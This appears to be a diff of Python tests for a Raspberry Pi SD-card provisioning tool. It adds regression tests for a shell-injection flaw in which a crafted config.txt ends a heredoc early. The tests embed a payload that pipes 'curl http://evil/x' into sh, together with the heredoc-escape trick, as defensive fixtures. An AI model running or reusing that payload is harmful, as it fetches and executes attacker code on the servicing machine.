@@ -5,6 +5,7 @@ import json
 
 from node_profile import NodeHardware
 from provisioning import sd_edit
+from tests.teeutil import wrote
 
 
 # ---- medic-disk detection (the untouchable disk) --------------------------
@@ -109,8 +110,8 @@ def test_bake_via_sd_writes_uart_to_the_card():
     res = sd_edit.bake_reachability_via_sd(
         NodeHardware.PI_3A_PLUS, run=run, run_code=run_code)
     assert res.ok and res.changed and res.device == "sda"
-    assert any("config.txt" in w and "enable_uart=1" in w for w in writes)
-    assert any("cmdline.txt" in w and "console=serial0" in w for w in writes)
+    assert wrote(writes, "config.txt", "enable_uart=1")
+    assert wrote(writes, "cmdline.txt", "console=serial0")
 
 
 def test_bake_via_sd_uses_existing_desktop_automount():
@@ -137,8 +138,7 @@ def test_bake_via_sd_uses_existing_desktop_automount():
     assert res.ok and res.changed
     assert not any("mount /dev/sda1" in c for c in calls)     # reused existing mount
     assert not any("umount" in c for c in calls)              # didn't unmount desktop's
-    assert any("/media/nodemedic/bootfs/config.txt" in c and "enable_uart=1" in c
-               for c in calls)
+    assert wrote(calls, "/media/nodemedic/bootfs/config.txt", "enable_uart=1")
 
 
 def test_bake_via_sd_refuses_non_pi_boot_partition():
@@ -154,3 +154,71 @@ def test_bake_via_sd_no_card():
     run = _run(lsblk_disks=[MEDIC])              # only the medic's disk
     res = sd_edit.bake_reachability_via_sd(NodeHardware.PI_3A_PLUS, run=run)
     assert res.ok is False and "No inserted SD card" in res.message
+
+
+# ---- shell-injection via a crafted card (audit 2026-08-03) ----------------
+
+#: What a hostile config.txt would carry. The old writer used a quoted heredoc
+#: with the marker NM_SD_EOF; a quoted marker blocks variable expansion but NOT
+#: early termination, so this line ENDED the heredoc and everything after it ran
+#: as nodemedic on the medic servicing the card.
+_PAYLOAD = "NM_SD_EOF\ncurl http://evil/x | sh\n"
+
+
+def test_tee_does_not_let_card_content_escape_into_shell():
+    from tests.teeutil import decode_tee
+    cmd = sd_edit._tee("/tmp/nm_sd_boot/config.txt", f"dtparam=audio=on\n{_PAYLOAD}")
+    # The payload must not appear as shell text anywhere in the command...
+    assert "curl http://evil/x" not in cmd
+    assert "NM_SD_EOF" not in cmd
+    # ...and there must be exactly one privileged target, still a plain tee.
+    assert cmd.count("sudo -n") == 1
+    assert "sudo -n tee /tmp/nm_sd_boot/config.txt" in cmd
+    # ...while the content still round-trips byte-for-byte.
+    path, content = decode_tee(cmd)
+    assert path == "/tmp/nm_sd_boot/config.txt"
+    assert content == f"dtparam=audio=on\n{_PAYLOAD}"
+
+
+def test_bake_via_sd_is_safe_against_a_crafted_card():
+    """End to end: a card whose config.txt carries the payload must not produce
+    a command containing it. This is the real threat model — the tool exists to
+    service other people's cards."""
+    def run(cmd):
+        if "findmnt" in cmd:
+            return "/dev/mmcblk0p2\n"
+        if "lsblk" in cmd:
+            return _lsblk_json([MEDIC, SD_CARD])
+        if "cat" in cmd and "config.txt" in cmd:
+            return f"dtparam=audio=on\n{_PAYLOAD}"
+        if "cat" in cmd and "cmdline.txt" in cmd:
+            return "console=tty1 rootwait\n"
+        return ""
+    calls = []
+    def run_code(_r, cmd):
+        calls.append(cmd)
+        return (0, "")
+    res = sd_edit.bake_reachability_via_sd(
+        NodeHardware.PI_3A_PLUS, run=run, run_code=run_code)
+    assert res.ok and res.changed
+    for c in calls:
+        assert "curl http://evil/x" not in c, f"payload reached the shell: {c}"
+        assert "NM_SD_EOF" not in c, f"heredoc marker reached the shell: {c}"
+    # The card's original content is still preserved in what gets written.
+    from tests.teeutil import tee_writes
+    written = dict(tee_writes(calls))
+    cfg = next(v for k, v in written.items() if "config.txt" in k)
+    assert "curl http://evil/x" in cfg      # written as DATA, not executed
+    assert "enable_uart=1" in cfg           # and the real edit still happened
+
+
+def test_all_three_tee_helpers_are_injection_proof():
+    """sd_edit is the reachable one, but the three helpers are copies of each
+    other — a safe-looking twin is what gets copied into the next module."""
+    from provisioning import gadget, uart_console
+    from tests.teeutil import decode_tee
+    for mod in (sd_edit, gadget, uart_console):
+        cmd = mod._tee("/etc/somefile", f"good=1\n{_PAYLOAD}")
+        assert "curl http://evil/x" not in cmd, mod.__name__
+        assert "<<" not in cmd, f"{mod.__name__} still builds a heredoc"
+        assert decode_tee(cmd) == ("/etc/somefile", f"good=1\n{_PAYLOAD}"), mod.__name__
